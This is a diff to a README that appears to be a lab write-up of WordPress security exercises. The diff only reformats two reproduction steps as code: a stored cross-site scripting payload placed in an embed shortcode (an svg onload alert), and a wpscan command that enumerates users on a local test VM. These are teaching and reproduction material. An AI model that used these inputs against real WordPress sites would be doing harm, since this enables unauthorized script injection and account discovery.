@@ -14,7 +14,7 @@ Time spent: **48** hours spent in total
 - Fixed in version: 4.7.3
 - [ ] GIF Walkthrough: <img src="2022-10-28-12-50-39.gif">
 - [ ] Steps to recreate: 
-- Create a post with the following text: [embed src='http://www.youtube.com/embed/sss\x3csvg onload=alert(1)\x3e'][/embed]
+- Create a post with the following text: ``[embed src='http://www.youtube.com/embed/sss\x3csvg onload=alert(1)\x3e'][/embed]``
 - [ ] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
   
@@ -40,6 +40,6 @@ Tested in version: 4.2
 Fixed in version: 4.7.3 
 - [ ] GIF Walkthrough: <img src="2022-10-28-12-55-33.gif">
 - [ ] Steps to recreate: 
-- Paste the following code to kali-linux terminal: wpscan --url wpdistillery.vm --enumerate u
+- Paste the following code to kali-linux terminal: ``wpscan --url wpdistillery.vm --enumerate u``
 - [ ] Affected source code:
   - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
